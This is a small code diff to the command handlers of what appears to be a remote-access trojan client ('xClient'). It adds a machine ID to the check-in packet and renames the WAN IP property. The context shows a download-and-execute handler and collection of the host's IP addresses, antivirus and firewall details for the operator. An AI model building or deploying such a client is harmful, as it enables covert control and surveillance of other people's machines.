@@ -35,7 +35,7 @@ namespace xClient.Core.Commands
 		public static void HandleInitializeCommand(Packets.ServerPackets.InitializeCommand command, Client client)
 		{
 			SystemCore.InitializeGeoIp();
-			new Packets.ClientPackets.Initialize(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType, SystemCore.Country, SystemCore.CountryCode, SystemCore.Region, SystemCore.City, SystemCore.ImageIndex).Execute(client);
+			new Packets.ClientPackets.Initialize(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType, SystemCore.Country, SystemCore.CountryCode, SystemCore.Region, SystemCore.City, SystemCore.ImageIndex, SystemCore.GetId()).Execute(client);
 		}
 
 		public static void HandleDownloadAndExecuteCommand(Packets.ServerPackets.DownloadAndExecute command, Client client)
@@ -380,7 +380,7 @@ namespace xClient.Core.Commands
 					"LAN IP Address",
 					SystemCore.GetLanIp(),
 					"WAN IP Address",
-					SystemCore.WANIP,
+					SystemCore.WanIp,
 					"Antivirus",
 					SystemCore.GetAntivirus(),
 					"Firewall",
